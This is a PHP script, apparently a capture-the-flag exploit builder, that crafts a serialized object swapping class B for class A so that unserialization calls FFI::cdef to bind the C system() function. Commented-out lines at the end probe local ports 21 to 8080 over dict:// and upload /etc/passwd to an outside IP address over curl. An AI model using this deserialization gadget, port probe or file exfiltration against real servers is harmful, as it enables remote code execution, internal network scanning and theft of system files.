<?php
// echo error_get_last();
final class A implements Serializable {
	protected $data = [
		'ret' => null,
		'func' => 'print_r',
		'arg' => '1',
	];

	private function run() {
		echo "__serialize\r\n";
		$this->data['ret'] = $this->data['func']($this->data['arg']);
	}

	public function __serialize(): array{
		echo "__serialize\r\n";
		return $this->data;
	}

	public function __unserialize(array $data) {
		echo "__unserialize\r\n";
		array_merge($this->data, $data);
		$this->run();
	}

	public function serialize(): string {
		echo "serialize\r\n";
		return serialize($this->data);
	}

	public function unserialize($payload) {
		echo "unserialize\r\n";
		$this->data = unserialize($payload);
		$this->run();
	}

	public function __get($key) {
		echo "__get\r\n";
		return $this->data[$key];
	}

	public function __set($key, $value) {
		echo "__set\r\n";
		$this->data[$key] = $value;
		// throw new \Exception('No implemented');
	}

	public function __construct() {
		// throw new \Exception('No implemented');
	}
}
class B implements Serializable {
	protected $data = [
		'ret' => null,
		'func' => 'print_r',
		'arg' => '1',
	];
	public function __construct($func = 'print_r', $arg = '1') {
		$this->data['func'] = $func;
		$this->data['arg'] = $arg;
	}
	public function serialize(): string {
		return serialize($this->data);
	}
	public function unserialize($payload) {
		$this->data = unserialize($payload);
	}
}
$a = new B("FFI::cdef", "int system(char *command);");
$s = str_replace('C:1:"B":', 'C:1:"A":', serialize($a));
// echo "emmm\r\n";
// unserialize($s);

// print_r(error_get_last());
echo "unserialize('$s');";

// // $x = unserialize($s);
// // $x->func = "var_dump";
// // echo $x->serialize();
// //

// foreach ([21,22,23,80,8080,3306] as $p) {
//     $ch = curl_init();
//     curl_setopt($ch,CURLOPT_URL,"dict://127.0.0.1:$p");
//     $output = curl_exec($ch);
//     echo ($output === FALSE ) ? curl_error($ch):$output;
//     curl_close($ch);
// }
// ini_set("open_basedir", __DIR__);
// $ch = curl_init();
// curl_setopt($ch, CURLOPT_URL, "http://47.101.138.236:8080");
// curl_setopt($ch, CURLOPT_POSTFIELDS, ['file' => new CURLFile("/etc/passwd")]);
// $output = curl_exec($ch);
// echo ($output === FALSE) ? curl_error($ch) : $output;
// curl_close($ch);